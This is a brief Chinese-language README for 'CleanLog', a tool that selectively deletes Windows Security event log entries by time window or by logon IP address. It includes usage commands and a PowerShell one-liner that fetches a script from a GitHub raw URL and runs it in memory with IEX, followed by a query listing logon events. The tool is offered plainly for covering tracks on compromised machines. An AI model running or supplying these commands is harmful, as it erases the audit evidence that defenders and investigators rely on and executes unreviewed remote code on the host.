# CleanLog
可以按IP,分钟和小时级别清除windows的安全日志
### 用法
```
ClearnLog -EventLogName Security -Mins 5 #删除5分钟内的安全日志.
ClearnLog -EventLogName Security -Hours 1 #删除1小时内的安全日志.
ClearnLog -EventLogName Security -IpAddress 127.0.0.1 #删除IP为127.0.0.1的登录日志.
```
### powershell 命令
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/isafe/CleanLog/main/clear.ps1'); CleanLog -EventLogName Security -Hours 1
```
### 验证
```
Get-EventLog -logname Security -InstanceId 4624 | Where-Object {$_.ReplacementStrings[8] -eq 3} | Select-Object timegenerated,@{Name='UserName'; Expression={$_.ReplacementStrings[5]}},@{Name='IP';Expression={$_.ReplacementStrings[-9]}},@{Name='HostName';Expression={$_.ReplacementStrings[11]}} 
```
